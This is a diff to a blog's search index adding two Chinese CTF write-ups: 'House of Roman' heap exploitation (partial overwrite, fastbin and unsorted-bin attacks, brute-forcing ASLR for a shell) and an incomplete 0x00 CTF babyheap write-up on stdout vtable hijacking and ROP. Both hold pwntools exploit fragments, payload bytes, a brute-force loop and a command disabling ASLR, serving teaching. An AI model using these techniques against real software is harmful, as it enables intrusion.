@@ -3,6 +3,96 @@
   
     
     <entry>
+      <title><![CDATA[House of Roman 实战]]></title>
+      <url>/2018/05/08/house_of_roman.html</url>
+      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是前几天国外一个 <a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="external">老哥</a> 提出的一种思路 ，学习了一下感觉其中的堆布局的手法还不错，做个分享与记录。</p>
+<p>这种利用手法的主要特点是不需要 <code>leak libc</code>的地址，通过 堆内存的布局 和 堆相关的漏洞（<code>uaf</code> 等) 就可以 <code>getshell</code>。下面一个示例的题目为例介绍一下</p>
+<p>相关文件位于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://t.cn/Ru0eX62</div></pre></td></tr></table></figure>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>查看开启的保护措施</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">04:44 haclh@ubuntu:house_of_roman $ checksec ./new_chall</div><div class="line">[*] &apos;/home/haclh/workplace/house_of_roman/new_chall&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div></pre></td></tr></table></figure>
+<p>开了 <code>pie</code> .</p>
+<p>程序主要就三个功能</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212359-bdef24b0-4c79-1.png" alt="image.png"></p>
+<ul>
+<li><code>Malloc</code> ， 用户输入 <code>size</code>, 然后 <code>malloc(size)</code> , 大小不限</li>
+<li><code>Write</code>,  往指定 <code>heap_ptr</code> 写入 <code>size+1</code> 字节数据，一字节溢出</li>
+<li><code>Free</code>, 调用 <code>free</code> 释放掉 <code>heap_ptr</code> ，不过没有清零，<code>double free</code> 和  <code>uaf</code> （<code>Write</code> 时只是校验 指针是否为 <code>0</code>）.</li>
+</ul>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>因为没有 <code>leak</code> 的机会，同时还还有 <code>aslr</code> ， 因为 <code>aslr</code> 随机化的 比特数是有限的， 低 <code>12bit</code> 的随机化程度还是比较小，这就给了爆破的机会。</p>
+<p><code>House of Roman</code> 的一个核心思路就是利用 <strong>局部写 减少随机化的程度，从而给出爆破的可能</strong>。</p>
+<p>程序开了 <code>pie</code> ，一般的思路就是 写 <code>malloc_hook</code> 或者其他的一些 <code>hook</code>, 然后触发  <code>malloc</code> ， <code>getshell</code>。 </p>
+<blockquote>
+<p>其中如果是 <code>64</code> 位程序，通过<code>malloc_printerr</code>  触发 <code>malloc</code> ，基本可以稳定 <code>getshell</code> 。</p>
+</blockquote>
+<p>总的一个利用步骤如下 (<code>chunk</code> 指的是 <code>malloc</code> 源码中的 <code>chunk</code> ,包含元数据)</p>
+<ul>
+<li>首先分配 <code>3</code> 个 <code>chunk （A , B, C）</code> ，大小分别为 <code>0x20, 0xd0, 0x70</code></li>
+<li>在 <code>B + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ,用于后面 的 <code>fastbin attack</code></li>
+<li>释放掉 <code>B</code> , <code>B</code> 进入 <code>unsorted bin</code> , 此时 <code>B+0x10</code> 和  <code>B+0x18</code> 中有 <code>main_arean</code> 的地址</li>
+<li>再次分配 <code>0xd0</code> , 会分配到 <code>B</code>，  此时 <code>B+0x10</code> 和  <code>B+0x18</code>  中  <code>main_arean</code> 的地址依然存在</li>
+<li>然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk (D , E, F)</code>， 为后续做准备</li>
+<li>在 <code>A</code> 触发 单字节溢出，修改 <code>B-&gt;size = 0x71</code> . 然后释放 <code>C , D</code>， 此时 <code>C , D</code> 进入 <code>fastbin</code> , 同时 <code>D-&gt;fd = C</code>. 由于 <code>chunk</code>之间的相对偏移固定，于是利用 <code>uaf</code> 修改 <code>D-&gt;fd</code> 的低 字节 ，使得  <code>D-&gt;fd=B</code></li>
+<li>此时 <code>B-&gt;size = 0x71</code> ，同时  <code>B + 0x78</code> 为 <code>p64(0x61)</code> （第2步设置）， 这就成功伪造了一个 <code>0x70</code> 大小的 <code>fastbin</code>。 此时 <code>B-&gt;fd</code> 为 <code>main_arean</code> 的地址，于是通过 修改 低 <code>2</code>个字节，可以修改到  <code>malloc_hook - 0x23</code> 处  （  <code>malloc_hook - 0x23 + 0x8</code> 处的值为 <code>p64(0x7f)</code> )</li>
+<li>然后分配 <code>3</code> 次  <code>0x70</code> 的 <code>chunk</code>， 就可以拿到包含 <code>malloc_hook</code> 的 <code>chunk</code>, 此时 <code>malloc_hook</code>  内容为 <code>0</code></li>
+<li>然后利用 <code>unsorted bin</code> 修改 <code>malloc_hook</code> 内容为 <code>main_arean</code> 的地址</li>
+<li>利用部分写修改 <code>malloc_hook</code> 为 <code>one_gadget</code></li>
+<li>多次释放一个指针，触发 <code>double free</code> 异常，进而触发 <code>malloc_printerr</code>  ， <code>getshell</code></li>
+</ul>
+<p>下面根据 <code>exp</code> 具体看看。</p>
+<h2 id="exp分析"><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h2><p>分配 <code>3</code> 个 <code>chunk</code> ，在 <code>B + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ,用于后面 的 <code>fastbin attack</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">create(0x18,0) # 0x20</div><div class="line">create(0xc8,1) # d0</div><div class="line">create(0x65,2)  # 0x70</div><div class="line"></div><div class="line">info(&quot;create 2 chunk, 0x20, 0xd8&quot;)</div><div class="line">fake = &quot;A&quot;*0x68</div><div class="line">fake += p64(0x61)  ## fake size</div><div class="line">edit(1,fake)</div><div class="line">info(&quot;fake&quot;)</div></pre></td></tr></table></figure>
+<p>释放掉 <code>B</code> , 然后分配同样大小再次分配到 <code>B</code> , 此时 <code>B+0x10</code> 和  <code>B+0x18</code> 中有 <code>main_arean</code> 的地址。分配 <code>3</code> 个 <code>fastbin</code> ，利用 <code>off by one</code> 修改 <code>B-&gt;size = 0x71</code>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">free(1)</div><div class="line">create(0xc8,1)</div><div class="line"></div><div class="line">create(0x65,3)  # b</div><div class="line">create(0x65,15)</div><div class="line">create(0x65,18)</div><div class="line"></div><div class="line">over = &quot;A&quot;*0x18  # off by one</div><div class="line">over += &quot;\x71&quot;  # set chunk  1&apos;s size --&gt; 0x71</div><div class="line">edit(0,over)</div><div class="line">info(&quot;利用 off by one ,  chunk  1&apos;s size --&gt; 0x71&quot;)</div></pre></td></tr></table></figure>
+<p>生成两个 <code>fastbin</code> ，然后利用 <code>uaf</code> ，部分地址写，把 <code>B</code> 链入到 <code>fastbin</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">free(2)</div><div class="line">free(3)</div><div class="line">info(&quot;创建两个 0x70 的 fastbin&quot;)</div><div class="line">heap_po = &quot;\x20&quot;</div><div class="line">edit(3,heap_po)</div><div class="line">info(&quot;把 chunk&apos;1 链入到 fastbin 里面&quot;)</div></pre></td></tr></table></figure>
+<p>调试看看此时 <code>fastbin</code> 的状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; fastbins </div><div class="line">fastbins</div><div class="line">0x20: 0x0</div><div class="line">0x30: 0x0</div><div class="line">0x40: 0x0</div><div class="line">0x50: 0x0</div><div class="line">0x60: 0x0</div><div class="line">0x70: 0x555555757160 —▸ 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x7ffff7dd1b78</div><div class="line">0x80: 0x0</div></pre></td></tr></table></figure>
+<blockquote>
+<p><code>0x555555757020</code> 就是 <code>chunk B</code> </p>
+</blockquote>
+<p>然后通过修改 <code>B-&gt;fd</code> 的低 <code>2</code> 字节， 使得  <code>B-&gt;fd= malloc_hook - 0x23</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># malloc_hook 上方</div><div class="line">malloc_hook_nearly = &quot;\xed\x1a&quot;</div><div class="line">edit(1,malloc_hook_nearly)</div><div class="line">info(&quot;部分写，修改 fastbin-&gt;fd ---&gt; malloc_hook&quot;)</div></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212420-ca9f3a92-4c79-1.png" alt="image.png"></p>
+<p>然后分配 <code>3</code> 个  <code>0x70</code>  的 <code>chunk</code> ，就可以拿到 <code>malloc_hook</code>  所在的那个 <code>chunk</code>  .</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">create(0x65,0)</div><div class="line">create(0x65,0)</div><div class="line">create(0x65,0)</div><div class="line">info(&quot;0 拿到了 malloc_hook&quot;)</div></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212428-cf4ceaa8-4c79-1.png" alt="image.png"></p>
+<p>然后 <code>free</code> 掉 <code>E</code> ，进入 <code>fastbin</code> ，利用 <code>uaf</code> 设置 <code>E-&gt;fd = 0</code> ， 修复了 <code>fastbin</code> (好思路)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">free(15)</div><div class="line">edit(15,p64(0x00))</div><div class="line">info(&quot;再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin&quot;)</div></pre></td></tr></table></figure>
+<p>然后是 unsorted bin 攻击，使得 malloc_hook 的值为  main_arena+88</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">create(0xc8,1)</div><div class="line">create(0xc8,1)</div><div class="line">create(0x18,2)</div><div class="line">create(0xc8,3)</div><div class="line">create(0xc8,4)</div><div class="line">free(1)</div><div class="line">po = &quot;B&quot;*8</div><div class="line">po += &quot;\x00\x1b&quot;</div><div class="line">edit(1,po)</div><div class="line">create(0xc8,1)</div><div class="line">info(&quot;unsorted bin 使得 malloc_hook 有 libc 的地址&quot;)</div></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212437-d45de9fc-4c79-1.png" alt="image.png"></p>
+<p>利用 修改 <code>malloc_hook</code> 的低三个字节 ，使得 <code>malloc_hook</code> 为 <code>one_gadget</code> 的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">over = &quot;R&quot;*0x13   # padding for malloc_hook</div><div class="line">over += &quot;\xa4\xd2\xaf&quot;</div><div class="line">edit(0,over)</div><div class="line"></div><div class="line">info(&quot;malloc_hook to one_gadget&quot;)</div></pre></td></tr></table></figure>
+<p>然后 <code>free</code> 两次同一个 <code>chunk</code> ，触发 <code>malloc_printerr</code>  ， <code>getshell</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">free(18)</div><div class="line">free(18)</div></pre></td></tr></table></figure>
+<p>上面的偏移为一次调试所得，开启 <code>aslr</code> 后，需要跑很多次 （碰运气， 写个脚本重复执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">for i in `seq 1 5000`; do python final.py; done;</div></pre></td></tr></table></figure>
+<p>跑啊跑就出 <code>shell</code> </p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212444-d891400a-4c79-1.png" alt="image.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总的思路就是 <strong>部分地址写 + 爆破</strong> 绕过 <code>aslr</code> . 其中的有趣的部分是堆布局，利用 <code>off by one</code> 伪造 <code>fastbin</code> 链 ， 利用 <code>unsorted bin attack</code> 设置 <code>libc</code> 的地址的部分。</p>
+<p>调试 <code>pie</code> 程序，关了 <code>aslr</code> 方便调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
+<p><strong>参考</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc</div><div class="line">https://github.com/romanking98/House-Of-Roman</div></pre></td></tr></table></figure>
+]]></content>
+      
+        <categories>
+            
+            <category> ctf </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> hourse of roamn </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[ciscn2018-pwn-wp]]></title>
       <url>/2018/05/01/ciscn2018-pwn-wp.html</url>
       <content type="html"><![CDATA[<p>2018全国大学生网络安全竞赛 ，做了2 道题</p>
@@ -25,6 +115,119 @@
             
         </categories>
         
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Pwn with File结构体之利用 vtable 进行 ROP]]></title>
+      <url>/2018/04/30/pwn_with_file_rop_by_vtable.html</url>
+      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文以  <code>0x00 CTF 2017</code> 的 <code>babyheap</code> 为例介绍下通过修改 <code>vtable</code> 进行 <code>rop</code> 的操作 (:-_-</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先查看一下程序开启的安全措施</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">18:07 haclh@ubuntu:0x00ctf $ checksec ./babyheap</div><div class="line">[*] &apos;/home/haclh/workplace/0x00ctf/babyheap&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Full RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div></pre></td></tr></table></figure>
+<p>没开 <code>PIE</code> 。</p>
+<p>接下来看看程序</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135126-8572abf0-4c3a-1.png" alt="image.png"></p>
+<p>对程序功能做个介绍</p>
+<ul>
+<li>程序一开始需要用户往 <code>bss</code> 段的 <code>name</code> 缓冲区输入内容</li>
+<li><code>add</code>  函数: 增加一个 <code>user</code>, 其实就是根据需要的大小使用 <code>malloc</code> 分配内存， 然后读入 <code>username</code>.</li>
+<li><code>edit</code> 函数: 根据输入的 <code>index</code> ， 取出指针， 往里面写入内容。 <strong><code>index</code> 没有校验</strong>。</li>
+<li><code>ban</code> 函数:  <code>free</code> 掉一个 <code>user</code>.</li>
+<li><code>changename</code> 函数: 修改 <code>bss</code> 段的 <code>name</code></li>
+</ul>
+<ul>
+<li>输入为 <code>5</code> 时， 会打印 <code>read</code> 函数的地址， 这样就可以拿到 <code>libc</code> 的基地址了。</li>
+</ul>
+<p>来看看 <code>edit</code> 函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135136-8b300ad8-4c3a-1.png" alt="image.png"></p>
+<p>直接使用我们输入的数字作为数组索引，在  <code>users</code> 数组中取到 <code>obj</code> 指针，然后使用 <code>strlen</code> 获取输入的长度，最后调用 <code>read</code> 往 <code>obj</code> 里面写内容。</p>
+<p>如果我们输入的数字大于 <code>users</code> 数组的长度就可以读取  <code>users</code> 数组 外面的数据作为 <code>read</code> 读取数据的指针了。</p>
+<p>下面来看看 <code>bss</code> 段的布局</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135145-90f64eb4-4c3a-1.png" alt="image.png"></p>
+<p>我们可以看到 <code>users</code> 后面就是 <code>name</code> 缓冲区， <code>name</code> 的内容我们可控， 于是利用 <code>edit</code> 函数里面的 <strong>越界读</strong> 漏洞，我们就可以伪造 <code>obj</code> 指针， 然后在 通过  <code>read</code> 读取数据时 就可以往 <code>obj</code> 指针处写东西， <strong>任意地址写</strong></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="控制rip"><a href="#控制rip" class="headerlink" title="控制rip"></a>控制rip</h2><p>整理一下现在拥有的能力。</p>
+<ul>
+<li>通过 <strong>选项5</strong> 可以 <code>leak</code> 出 <code>libc</code> 的地址</li>
+<li>通过 <code>edit</code> 和 <code>changename</code> 可以实现任意地址写</li>
+</ul>
+<p>题目给的 <code>libc</code> 是 <code>2.23</code>，没有虚表保护，于是选择改 <code>stdout</code> 的虚表指针，这样我们就可以伪造 <code>stdout</code> 的虚表，然后在调用虚表的时候，就可以控制 <code>rip</code> 了。</p>
+<p>我们知道  <code>stdout</code>  是 <code>_IO_FILE_plus</code> 类型，大小为 <code>0xe0</code> ， 最后 <code>8</code> 个字节是 <code>vtable</code> （即 <code>stdout+0xd8</code> 处）， 类型是<code>struct  _IO_jump_t</code> 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; p/x sizeof(struct _IO_FILE_plus )</div><div class="line">$8 = 0xe0</div><div class="line">pwndbg&gt; p ((struct _IO_FILE_plus*)stdout)-&gt;vtable </div><div class="line">$9 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</div><div class="line">pwndbg&gt; p/x sizeof(struct _IO_jump_t )</div><div class="line">$10 = 0xa8</div><div class="line">pwndbg&gt;</div></pre></td></tr></table></figure>
+<p>我们不能 <code>leak</code> 堆的地址，伪造虚表只能在 <code>name</code> 缓冲区内伪造，<code>name</code> 缓冲区的大小为 <code>0x28</code> , 而 虚表（<code>struct _IO_jump_t</code>）的大小 为 <code>0xa8</code>  ， 所以是不能伪造整个虚表的， 不过我们只需要把虚表中接下来会被调用的项的指针改了就行了 。有点绕，直接调试看。</p>
+<p>首先使用选项5的函数， <code>leak</code> 出 <code>libc</code> 的基地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 首先利用 gift 泄露 libc</div><div class="line">choice(5)</div><div class="line">p.recvuntil(&quot;your gift:\n&quot;)</div><div class="line">libc.address = int(p.recvline().strip()) - libc.symbols[&apos;read&apos;]</div><div class="line">stdout_vtable_addr = libc.symbols[&apos;_IO_2_1_stdout_&apos;] + 0xd8   #  IO_2_1_stdout-&gt;vtable 的地址</div></pre></td></tr></table></figure>
+<p>然后我们在 <code>name</code> 缓冲区内布置好内容，让 越界读 使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># 在 name buf 布置数据</div><div class="line">choice(4)</div><div class="line">payload = &quot;&quot;</div><div class="line">payload += p64(stdout_vtable_addr)  # 修改虚表指针</div><div class="line">payload += cyclic(0x28 - len(payload))</div><div class="line">p.sendafter(&quot;enter new name:&quot;, payload)</div></pre></td></tr></table></figure>
+<p>数据布置好了以后，利用 <code>edit</code> 里面的越界读漏洞，进行任意地址写， 修改 <code>IO_2_1_stdout-&gt;vtable</code> 为 <code>name</code> 缓冲区的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">bss_name = 0x6020A0  # bss name 缓冲区的地址</div><div class="line"></div><div class="line"># 利用 越界 获取指针的漏洞进行任意地址写</div><div class="line">choice(2)</div><div class="line">p.sendlineafter(&quot;2. insecure edit&quot;, &quot;2&quot;)</div><div class="line">sleep(0.1)</div><div class="line">p.sendlineafter(&quot;index: &quot;, &apos;12&apos;)   # index 12 ---&gt; 会从 name 缓冲区开始处取8字节作为指针</div><div class="line">sleep(0.1)</div><div class="line">payload = p64(bss_name) # 修改 vtable 的值， 把 vtable 改成 bss_name</div><div class="line">p.sendafter(&quot;new username: &quot;, payload[:6])   # 修改的数据， 把虚表改到 bss .</div></pre></td></tr></table></figure>
+<p>使用 <code>ida</code> 可以看到 <code>users</code> 数组的起始地址为 <code>0x0602040</code> , <code>name</code> 缓冲区的地址 为 <code>0x006020a0</code>。 所以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(0x006020a0-0x00602040)/8 = 12</div></pre></td></tr></table></figure>
+<p>这样一来就会把 <code>name</code> 缓冲区开始 的 <code>8</code> 个字节作为 <code>user</code> 指针对其进行内容修改。而在之前我们已经布局好 <code>name</code> ，使得 <code>name</code> 缓冲区开始 的 <code>8</code> 个字节 为  <code>IO_2_1_stdout-&gt;vtable</code> 的地址，这样在后面设置 <code>new username</code> 时 就可以修改   <code>IO_2_1_stdout-&gt;vtable</code>  了。</p>
+<p>然后输入 <code>new username</code> 为 <code>p64(bss_name)</code> 前 <code>6</code> 字节 ， 就可以修改   <code>IO_2_1_stdout-&gt;vtable</code> 为 <code>name</code> 缓冲区的地址。</p>
+<blockquote>
+<p>只发送前 6 个字节的原因是 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; len = strlen(obj);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>长度是用 <code>strlen</code> 获取的， <code>IO_2_1_stdout-&gt;vtable</code>  原来的值是  <code>libc</code>  的地址开始的 <code>6</code> 个字节是非 <code>\x00</code>， 所以 <code>strlen</code> 会返回 <code>6</code>。</p>
+</blockquote>
+<p>接下来使用到 <code>stdout</code> 时，就会用到伪造的 虚表 （<code>name</code> 缓冲区）</p>
+<p>调试看看， 会发现 <code>crash</code> 了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135200-99ddb7f6-4c3a-1.png" alt="image.png"></p>
+<p>这里没有破坏栈的数据，所以栈回溯应该是正确的，所以看看栈回溯</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135208-9e8ee0cc-4c3a-1.png" alt="image.png"></p>
+<p>可以看到 <code>call [$rax + 0x38]</code> ， 然后 <code>$rax</code> 是 <code>name</code> 缓冲区的地址</p>
+<p>所以现在 $rax 的值我们可控， 只需要使得  rax + 0x38 也可控即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$rax  = bss_name - 0x18</div><div class="line">$rax + 0x38 ---&gt; bss_name + 0x20</div></pre></td></tr></table></figure>
+<p>这样一来就可以控制 <code>rip</code> 了。</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>可以控制 <code>rip</code> 后， 同时还有 <code>libc</code> 的地址 <code>one_gadget</code> 可以试一试，不过这东西看运气，在这个题就不能用。这里我们使用 <code>rop</code> 来搞。</p>
+<p>要进行 <code>rop</code>  首先得控制栈的数据，现在 <code>rax</code> 是我们可控的，一般的思路就是利用 <code>xchg rax,rsp</code> 之类的 <code>gadget</code> 来迁移栈到我们可控的地方，这里采取另外一种方式， <strong>利用 <code>libc</code> 的代码片段 ，直接往栈里面写数据, 布置  rop 链</strong>。</p>
+<p>首先来分析下要用到的 <code>gadget</code></p>
+<p>位于 <code>authnone_create-0x35</code> 处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">.text:000000000012B82B                 mov     rdi, rsp        ; gadget start</div><div class="line">.text:000000000012B82E                 call    qword ptr [rax+20h]</div><div class="line">.text:000000000012B831                 mov     cs:dword_3C8D9C, eax</div><div class="line">.text:000000000012B837                 mov     rax, [rsp+38h+var_30]</div><div class="line">.text:000000000012B83C                 mov     rax, [rax+38h]</div><div class="line">.text:000000000012B840                 test    rax, rax</div><div class="line">.text:000000000012B843                 jz      short loc_12B84A</div><div class="line">.text:000000000012B845                 mov     rdi, rsp</div><div class="line">.text:000000000012B848                 call    rax</div><div class="line">.text:000000000012B84A</div><div class="line">.text:000000000012B84A loc_12B84A:                             ; CODE XREF: sub_12B7A0+A3↑j</div><div class="line">.text:000000000012B84A                 add     rsp, 30h</div><div class="line">.text:000000000012B84E                 pop     rbx</div><div class="line">.text:000000000012B84F                 retn</div></pre></td></tr></table></figure>
+<p>可以看到 首先</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rdi = rsp</div><div class="line">call    qword ptr [rax+20h]</div></pre></td></tr></table></figure>
+<p>这样只要然后 <code>rax+0x20</code> 为 <code>gets</code> 函数的地址，就可以往 栈里面写数据了。</p>
+<blockquote>
+<p>开始以为 gets 函数会读到 \x00 终止，后来发现不是, 函数定义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; gets 函数从流中读取字符串，直到出现换行符或读到EOF为止，最后加上NULL作为字符串结束</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p><code>EOF</code> 貌似是 <code>-1</code> ，所以我们可以读入 <code>\x00</code> ，而且输入数据的长度还是我们可控的 （通过控制 <code>\n</code> ）</p>
+</blockquote>
+<p>此时已经可以覆盖返回地址了，下面就是让 上面的代码块 执行完 gets 后进入 loc_12B84A ， 分支。</p>
+<p>执行完  <code>call    qword ptr [rax+20h]</code>  后，会从   <code>esp+8</code>   处取出 <code>8</code> 字节放到 <code>rax</code> ，然后判断 <code>rax+0x38</code> 处存放的值是不是 <code>0</code> ， 如果为 <code>0</code>, 就可以进入 <code>loc_12B84A</code> 进行 <code>rop</code> 了 .</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">.text:000000000012B831                 mov     cs:dword_3C8D9C, eax</div><div class="line">.text:000000000012B837                 mov     rax, [rsp+38h+var_30]</div><div class="line">.text:000000000012B83C                 mov     rax, [rax+38h]</div><div class="line">.text:000000000012B840                 test    rax, rax</div><div class="line">.text:000000000012B843                 jz      short loc_12B84A</div></pre></td></tr></table></figure>
+<h3 id="exp分析"><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h3><p>整理一下，分析分析最终的 <code>exp</code></p>
+<p>首先 <code>leak</code> 处 <code>libc</code> 的地址，获取到后面需要的一些 <code>gadget</code> 的地址</p>
+<p>然后往 <code>name</code> 缓冲区布置数据</p>
